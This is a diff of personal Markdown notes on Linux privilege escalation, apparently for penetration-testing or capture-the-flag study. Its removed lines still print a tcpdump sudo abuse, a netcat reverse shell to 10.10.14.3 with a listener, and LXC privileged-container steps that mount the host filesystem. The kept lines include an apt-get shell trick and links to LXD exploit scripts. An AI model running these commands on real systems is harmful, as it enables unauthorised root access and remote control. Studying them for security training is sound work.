@@ -195,95 +195,20 @@ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
 ```
 
 ## Sudo Rights Abuse 
-==add ttuorial for here == 
+
 ```bash
 sudo -l 
 ```
 
-```bash
-man tcpdump 
-```
-
-```bash
-victim-machine sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root  
-```
-
-```bash
-victim-machine  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f  
-```
-
-```
-victim-machine# sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root  
-
-```
-
-```
-attack-machine: nc -lvnp 443
-```
-
-sudo ncdu
-==sockets and privilege scalations = 
-== never went over how to use ncdu to escalate privileges==
 ## Privileged Groups 
 
-[resource1](https://github.com/initstring/lxd_root/blob/master/lxd_rootv1.sh) | [resource2](https://0toroot.com/learn/linux-privesc/lxd-lxc-privesc) | [lxd-automation-script](https://github.com/M4rc0HR/lxd-privesc)
+[resource1](https://github.com/initstring/lxd_root/blob/master/lxd_rootv1.sh) 
+
+[resource2](https://0toroot.com/learn/linux-privesc/lxd-lxc-privesc) 
+
+[lxd-automation-script](https://github.com/M4rc0HR/lxd-privesc)
 
 **LXD:** Similar to docker, ubuntu’s container manager 
 - Can be abused to create file, browse mounted host and gain access to password hashes or SSH keys
 - placing user in docker group is equivalent to root level access without password 
 - To exploit, must have lxd or lxc group 
-Steps 
-> [!Utilizing LXC]
-> 
-> 1. Identify id 
-> 2. Download alpine image from https://alpinelinux.org/downloads/
-> 3. Unzip alpine.zip image 
-> 4. Start lxd → lxd init 
-> 5. Import local image → lxc image import [alpine.tar.gz](http://alpine.tar.gz) [alpine.tar.gz](http://alpine.tar.gz).root --alias alpine 
-> 6. Start privileged container → lxc init alpine r00t -c security.privileged=true
-> 7. Mount host file system lxc config device add r00t  mydev disk source=/ path=/mnt/root recursive=true
-> 8. Spawn shell inside of instance 
-> 9. lxc start r00t
-> 10. Alpine$ lxc exec r00t /bin/sh
-> 
-****
-  
-**LXC**
-1. First, use existing container or get one from attacking machine 
-2. Import container as image
-``` hlt:ubuntutemp
-lxc image import ./image-file 
-
-lxc image list 
-
-lxc init ./image-file  privesc -c security.privileged=true
-
-lxc config device add privesc host-root disk source=/root path=/mnt/root recursive=true
-
-lxc init alpine-container privesc -c security.privileged=true
-
-lxc start privesc 
-
-lxc exec privesc /bin/sh
-
-# ubuntu temp: container name
-# privesc: name of image/os
-```
-
-1. Initiate image and specify security-privileged flag and root path for container. Then, start container and log in 
-``` hlt:ubuntutemp
-lxc init ubuntutemp privesc -c security.privileged=true
- 
-
-lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
-
-lxc start privesc
-
-lxc exec privesc /bin/bash
-
- 
- ls -l /mnt/root
-```
-
-grep -rw "flag" /var/log 2>/dev/null
-
